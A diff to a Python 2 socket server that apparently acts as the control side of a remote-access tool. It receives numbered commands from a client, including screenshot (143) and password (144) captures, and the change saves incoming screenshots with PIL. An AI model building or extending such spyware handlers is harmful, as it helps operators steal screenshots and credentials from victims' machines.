@@ -1,6 +1,8 @@
 import socket
 import sys
 import signal
+from PIL import Image
+from StringIO import StringIO
 
 def signal_handler(signal, frame):
         print('You pressed Ctrl+C!')
@@ -38,9 +40,8 @@ while 1:
     if cmd == "143": #screenshot
         size = getSizeOfCommand(client)
         data = client.recv(size)
-        f = open('C:\Users\Matt\Desktop\pic.png','w')
-        f.write(data.decode('base64'))
-        f.close()
+        im = Image.open(StringIO(data))
+        im.save('C:\Users\Matt\Desktop\\newpic.png','png')
     elif cmd == "144": #passwords
         size = getSizeOfCommand(client)
         data = client.recv(size)
